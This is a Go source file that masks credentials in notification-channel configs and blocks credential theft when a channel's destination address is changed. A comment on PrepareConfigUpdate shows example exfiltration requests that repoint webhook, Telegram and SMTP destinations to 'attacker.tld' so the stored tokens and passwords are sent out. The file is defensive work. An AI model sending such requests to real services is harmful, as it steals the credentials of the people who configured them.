package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes credentials,
// values with this prefix replace the real content; when the update endpoint receives a
// value with this prefix, it means "keep the stored original unchanged".
//
// A prefix is used instead of an empty string or a fixed constant so that a bit of
// identifiable information can be carried along (see MaskedValue), letting users tell
// "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"          original value too short, no hint given
//	"__masked__:…ab12cd"  carries the last 6 characters of the original as an identifier
//
// Exposing only the last 6 characters is a deliberate choice: the identifying part of a
// Webhook address is at the end (e.g. the WeCom key, the Feishu bot id), while the prefix
// is identical across bots and carries no identifying value. Six characters are not enough
// to reconstruct the credential, but enough for the configurator to recognize "it's my
// group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified since the API echo).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with this channel's credential fields replaced
// by masked values.
//
// An unknown channel type returns an empty map rather than the original config — better
// for the UI to show "configuration unavailable" than to dump the whole original content,
// which may contain credentials, when the channel type cannot be recognized. Non-credential
// fields are preserved so the UI can display normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as one credential as a whole: deciding
		// per sub-key would require each channel to declare another set of "which sub-keys
		// are credentials" rules — far more complexity than benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed, but
// the caller did not take a position on the credential fields". It is returned instead of
// silently allowing the change or silently dropping the credentials; see
// PrepareConfigUpdate for the reasoning.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly re-affirmed
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "The destination address (" + strings.Join(e.Changed, ", ") + ") has changed. " +
		"Please re-enter the credential fields (" + strings.Join(e.Missing, ", ") +
		"): provide new values, or explicitly leave them blank to indicate no credentials " +
		"are needed. The old credentials are only valid for the old address; reusing them " +
		"would hand them to the new address."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of a
// "destination address change".
//
// It replaces a bare MergeConfig on the channel update path, addressing this practically
// exploitable path: the destination address (where messages go) and the credentials (what
// identity is used to send) are two independent sets of fields, and MergeConfig always
// preserves stored values for keys that are "not mentioned". So anyone able to PATCH a
// channel only needs to **change the address and say nothing about the credentials** to
// make the server send the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header is sent out
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent and does not rely on redirects (so rejecting cross-host
// redirects does not stop it), and it directly defeats this package's masking goal —
// "credentials are never echoed to the browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must take an
// explicit position on **every** credential key:
//   - provide a new value → use it
//   - explicitly pass an empty string → this field no longer needs a credential (preserving
//     the clear semantics)
//   - echo the masked value unchanged / omit the key entirely → reject
//
// The third case is rejected too, because a "masked value" means exactly "reuse the old
// credential", and the old credential is only valid for the old address. "Automatically
// dropping credentials" is deliberately not done here — for optional credential fields
// (webhook headers, email password) it would silently become "authentication is gone but
// the endpoint returns 200", which is harder to diagnose than an error. Better to make the
// operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook headers, which is an object) embeds a
	// masked literal, the caller put the "keep the original" sentinel inside the structure.
	// MergeConfig only recognizes "a string with the prefix" as masked, so this form would
	// be stored verbatim as a plain object — the literal "__masked__" would really land in
	// the database, later authentication would silently fail with no error. Better to reject.
	//
	// This check must be **first**: when the address has not changed there is an early return,
	// so placing it later would cover only the "address changed" path (that is exactly where
	// the first version put it wrong, and the tests caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that actually changed. A masked value counts as
	// "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: do a normal merge (masked values keep the original, empty
		// strings clear, everything else overrides).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting a mask sentinel embedded in a non-string
// structure.
//
// Masking assumes "the whole value is a string". An object field like webhook headers can
// only be masked as a whole (written as the string "__masked__") or submitted as a whole;
// embedding the sentinel inside the object neither expresses "keep unchanged" nor avoids
// being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field must either be left blank entirely to keep the existing value, or submitted entirely as a new value; a mask placeholder cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialization is used
// to also handle type differences — the frontend submits a port as a number while the
// database returns float64, so direct == would misjudge.
//
// "Empty" must be normalized before comparison: in this config model an empty string and
// "key absent" are the same state, because MergeConfig treats an empty string as an
// explicit clear and simply deletes the key. Without normalization, an optional destination
// field that is always left blank (Telegram's base_url is the only such field: blank means
// use the official API) would go down this path —
//
//	created with base_url:""  →  first save has the key deleted by MergeConfig
//	→ second save has incoming "" while stored lacks the key, judged "address changed"
//	→ credential is a masked value → 400 "destination address has changed, please re-enter the credential fields"
//
// Every subsequent save would then fail unless the user re-pasted the Bot Token, even
// though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "blank".
// The criterion must match MergeConfig's clear test (strings.TrimSpace(s) == ""), otherwise
// there would be a gap where "MergeConfig thinks it should be deleted but sameConfigValue
// thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, used when updating channel config.
//
// Rules:
//   - keys whose incoming value is masked → keep stored's original value (the user did not
//     change this field)
//   - keys whose incoming value is an empty string → treat as an explicit clear, delete the
//     key
//   - all other keys → override with incoming's value
//   - keys in stored but absent from incoming → keep (partial update semantics)
//
// Whether an empty string counts as "clear" must be explicit: web forms submit unfilled
// fields as empty strings, and treating that as a valid value would really clear a field
// meant to be "left blank to keep the original". Explicit clear is chosen here, because
// when a user wants to remove a wrongly set field they have no other way to express it
// (removing the field could distinguish "not provided" from "provided empty", but the UI
// does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
